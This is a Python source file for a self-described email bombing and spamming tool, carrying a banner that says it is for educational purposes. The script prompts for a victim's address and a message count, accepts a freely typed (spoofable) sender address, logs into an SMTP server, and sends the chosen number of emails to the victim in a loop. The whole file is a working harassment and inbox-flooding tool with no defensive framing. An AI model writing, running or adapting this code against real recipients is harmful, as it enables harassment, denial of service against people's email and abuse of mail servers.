from time import sleep
from email.message import EmailMessage
from .env import Configuration
import smtplib
import sys


class EmailBombing:

    def __init__(self):
        print('                                                                    ')
        print('                                                                    ')
        print('            *************************************************       ')
        print('            #                                               #       ')
        print('            #        Email Bomber ( Spamming Tool )         #       ')
        print('            #                                               #       ')
        print('            #                 Version 0.0.1                  #       ')
        print('            #                                               #       ')
        print('            #     Modified by : Md Sharif Foysal Shoron     #       ')
        print('            #                                               #       ')
        print('            #       Only for Educational Purposes !!        #       ')
        print('            #                                               #       ')
        print('            *************************************************       ')
        print('')
    
    def send_email(self) :
        attacker_name = input('Attacker Name: ')
        attacker_email = input('Attacker Email: ')
        victim_name = input('Victim Name? : ')
        victim_email = input('Victim Email Address: ')
        total_email_send_to_victim = int(input('How much email wanna send? : '))
        custom_smtp = input('Want To Use Custom SMTP?: 1.Yes 2.No :-- ')
        if custom_smtp == 'Yes' or custom_smtp == '1':
            smtp_name = input('SMTP Address? : ')
            smtp_port = input('SMTP PORT? : ')
            smtp_email = input('SMTP User? : ')
            smtp_password = input('SMTP Password? : ')
        elif custom_smtp == 'No' or custom_smtp == '2':
            smtp_name = Configuration.smtp_name
            smtp_port = Configuration.smtp_port
            smtp_email = Configuration.smtp_email
            smtp_password = Configuration.smtp_password
        else:
            print('Please select correct Answer')
            sys.exit()
        email_subject = input('Message Subject? : ')
        email_message = input('Type your message for ... ')
        try:
            server = smtplib.SMTP(smtp_name, smtp_port)
            # server.ehlo()
            server.starttls()
            server.login(smtp_email, smtp_password)

            for sending in range(total_email_send_to_victim):
                email_final_body = EmailMessage()
                email_final_body.set_content(f"Hi {victim_name},\n{email_message}.\nKindest Regards,\n{attacker_name}")
                email_final_body['Subject'] = email_subject
                email_final_body['From'] = attacker_email
                email_final_body['To'] = victim_email
                server.send_message(email_final_body)
                print(f"E-mails sent: {sending}")
                sleep(1)
                sys.stdout.flush()

            server.quit()
        except KeyboardInterrupt:
            print ('[-] Canceled')
            sys.exit()
        except smtplib.SMTPAuthenticationError:
            print ('\n[!] The username, password or custom STMP server/port you entered is incorrect.')
            sys.exit()

if __name__ == '__main__':
    EmailBombing().send_email()
